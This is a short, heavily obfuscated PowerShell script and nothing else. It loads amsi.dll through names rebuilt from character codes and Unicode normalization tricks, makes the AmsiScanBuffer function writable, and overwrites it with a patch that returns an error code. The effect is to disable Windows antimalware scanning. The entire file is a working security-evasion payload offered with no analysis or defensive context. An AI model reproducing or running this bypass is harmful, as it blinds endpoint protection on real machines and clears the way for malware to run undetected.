$αϐϐr = @"
using System;
using System.Runtime.InteropServices;
public class αϐϐr {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ccrvcj, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $αϐϐr

$smoibhc = [αϐϐr]::LoadLibrary("$(('ämsì.d'+'ll').normALIZe([char]([BytE]0x46)+[ChAr]([byTe]0x6f)+[cHAR]([Byte]0x72)+[cHAr]([Byte]0x6d)+[ChAR](27+41)) -replace [chaR](92+8-8)+[cHaR](108+4)+[ChaR]([Byte]0x7b)+[CHar](77+10-10)+[cHar]([bYtE]0x6e)+[cHar]([bytE]0x7d))")
$mqacvr = [αϐϐr]::GetProcAddress($smoibhc, "$([cHaR]([BYtE]0x41)+[cHar](109)+[ChAr]([bYte]0x73)+[ChAR]([BYTE]0x69)+[char](83+56-56)+[ChAr](99+8-8)+[cHAR](97)+[CHAR]([bYte]0x6e)+[CHAr](23+43)+[cHAR]([BYtE]0x75)+[cHAR]([byTe]0x66)+[cHAr]([BYTe]0x66)+[cHar]([ByTe]0x65)+[cHAR]([ByTE]0x72))")
$p = 0
[αϐϐr]::VirtualProtect($mqacvr, [uint32]5, 0x40, [ref]$p)
$dsag = "0xB8"
$viam = "0x57"
$nonk = "0x00"
$pewf = "0x07"
$yuhz = "0x80"
$qtod = "0xC3"
$oclox = [Byte[]] ($dsag,$viam,$nonk,$pewf,+$yuhz,+$qtod)
[System.Runtime.InteropServices.Marshal]::Copy($oclox, 0, $mqacvr, 6)
